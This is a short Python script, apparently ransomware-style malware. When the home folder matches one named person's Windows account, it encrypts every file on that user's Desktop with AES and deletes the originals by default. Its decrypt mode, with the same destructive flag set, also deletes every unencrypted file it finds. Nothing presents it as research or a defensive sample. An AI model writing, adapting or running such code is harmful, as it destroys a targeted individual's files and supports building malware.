import os

import cr

# encryption/decryption buffer size - 64K
BUFFERSIZE = 64 * 1024
DESTRUCTIVE = True
DECRYPT = False
userPath = os.path.expanduser("~")
path = userPath + '\\Desktop'

def apocalypse():
    if DECRYPT:
        print("DECRYPTING...")
    else:
        print("ENCRYPTING...")
    if DESTRUCTIVE:
        print("DESTRUCTIVE ENABLED")
    else:
        print("DESTRUCTIVE DISABLED")
    dirList = os.listdir(path)
    for objet in dirList:
        if os.path.isfile(path+"\\"+objet)and not(objet == 'main.py')and not(objet == 'cr.py'):
            if DECRYPT:
                if '.aes' in objet:
                    cr.decryptFile(path+"\\"+objet, path+"\\"+objet[:-4], cr.password, BUFFERSIZE)
                if DESTRUCTIVE:
                    os.remove(path+"\\"+objet)

            else:
                cr.encryptFile(path+"\\"+objet, path+"\\"+objet+".aes", cr.password, BUFFERSIZE)
                if DESTRUCTIVE:
                    os.remove(path+"\\"+objet)

# detecteur de tibo
if userPath == 'C:\\Users\\Valérie de Brémand':
    print("TIBO DETECTE")
    apocalypse()